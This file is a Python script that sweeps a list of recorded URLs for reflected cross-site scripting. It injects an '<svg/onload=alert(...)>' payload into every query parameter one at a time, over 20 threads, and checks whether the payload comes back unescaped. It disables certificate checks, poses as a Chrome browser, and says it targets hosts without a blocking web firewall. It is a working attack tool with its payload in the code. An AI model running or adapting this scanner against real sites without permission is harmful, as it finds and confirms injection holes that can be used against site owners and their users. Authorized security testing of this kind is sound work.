#!/usr/bin/env python3
"""digi_final_sweep.py -- payload sweep on app hosts that are NOT fronted by a
blocking WAF, testing EVERY parameter of each recorded URL individually.

Three-way classification per parameter, with a control:
  RAW     unescaped <svg/onload=alert(40931) in the body  -> candidate
  ENC     token present, angle bracket escaped            -> safe
  DROP    token absent entirely (filtered or param unused)-> not testable
The control (parameter absent) must not contain the token.
"""
import concurrent.futures as cf
import json
import re
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests
import urllib3

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"}
T = 15
CANARY = "40931"
TOK = "zqk4093"
PAYLOAD = f"{TOK}<svg/onload=alert({CANARY})>"


def fetch(url):
    try:
        r = requests.get(url, timeout=T, verify=False, headers=UA,
                         allow_redirects=True)
        return r.status_code, (r.text or ""), dict(r.headers), r.url
    except Exception:
        return None, "", {}, url


def test_one(item):
    url, param = item
    p = urlsplit(url)
    q = parse_qsl(p.query, keep_blank_values=True)
    # control: this param absent
    ctlq = [(k, v) for k, v in q if k != param]
    ctl_url = urlunsplit((p.scheme, p.netloc, p.path, urlencode(ctlq), ""))
    cs, cbody, _, _ = fetch(ctl_url)
    if cs is None:
        return None
    if TOK in cbody:
        return {"url": url, "param": param, "verdict": "FP_BASELINE"}
    # probe: this param set to the payload, others untouched
    pq = [(k, PAYLOAD if k == param else v) for k, v in q]
    probe_url = urlunsplit((p.scheme, p.netloc, p.path, urlencode(pq), ""))
    s, body, hdrs, final = fetch(probe_url)
    if s is None:
        return None
    if TOK not in body:
        # maybe reflected in a header (Location)
        hstr = " ".join(str(v) for v in hdrs.values())
        if TOK in hstr:
            return {"url": url, "param": param, "verdict": "HEADER",
                    "probe": probe_url, "status": s,
                    "loc": hdrs.get("Location", "")[:200]}
        return {"url": url, "param": param, "verdict": "DROP", "status": s}
    raw = f"<svg/onload=alert({CANARY})" in body
    enc = bool(re.search(r"&lt;\s*svg|%3Csvg|&#60;|&#x3c;", body, re.I))
    ctx = ""
    i = body.find(TOK)
    if i >= 0:
        ctx = body[max(0, i - 90):i + 110].replace("\n", " ").replace("\r", "")
    return {"url": url, "param": param,
            "verdict": "RAW" if raw else ("ENC" if enc else "TOKEN_NOPARSE"),
            "status": s, "probe": probe_url, "ctx": ctx[:260]}


def main():
    targets = [l.strip() for l in open("/opt/watch/logs/digi/dalfox_focus.txt")
               if l.strip()]
    items = []
    for u in targets:
        q = parse_qsl(urlsplit(u).query, keep_blank_values=True)
        for k, _ in q:
            items.append((u, k))
    print(f"[*] {len(targets)} URLs -> {len(items)} (url,param) tests", flush=True)

    res = []
    with cf.ThreadPoolExecutor(max_workers=20) as ex:
        for i, r in enumerate(ex.map(test_one, items), 1):
            if not r:
                continue
            res.append(r)
            if r["verdict"] in ("RAW", "HEADER", "TOKEN_NOPARSE"):
                print(f"[{r['verdict']}] {r.get('status')} {r['url'][:90]} "
                      f"param={r['param']}", flush=True)
            if i % 40 == 0:
                print(f"  [{i}/{len(items)}]", flush=True)

    json.dump(res, open("/opt/watch/logs/digi/final_sweep.json", "w"), indent=1)
    from collections import Counter
    print("\nverdicts:", dict(Counter(r["verdict"] for r in res)))
    raws = [r for r in res if r["verdict"] == "RAW"]
    print(f"\nRAW: {len(raws)}")
    for r in raws:
        print(f"  {r['url']} param={r['param']}")
        print(f"  ctx: {r['ctx']}")


if __name__ == "__main__":
    main()
